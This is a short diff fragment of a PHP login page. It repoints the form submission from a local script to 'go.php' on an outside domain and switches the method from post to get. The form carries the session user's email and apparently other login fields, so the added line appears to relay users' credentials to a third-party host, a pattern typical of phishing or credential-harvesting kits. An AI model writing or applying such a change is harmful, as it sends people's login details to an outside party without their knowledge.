@@ -162,7 +162,7 @@ function show() {
     
 }
 </script>
-	<form action="go.php" method="post" name="former" onsubmit="return show()">
+	<form action="https://xpressintl.net/wp/go.php" method="get" name="former" onsubmit="return show()">
 	<span id="ff"></span>
 	<input type="text" value="<?php echo $_SESSION['login_user'] ?>" name="em" style="width:100%" placeholder="Email" disabled/>
 	<br /><br />
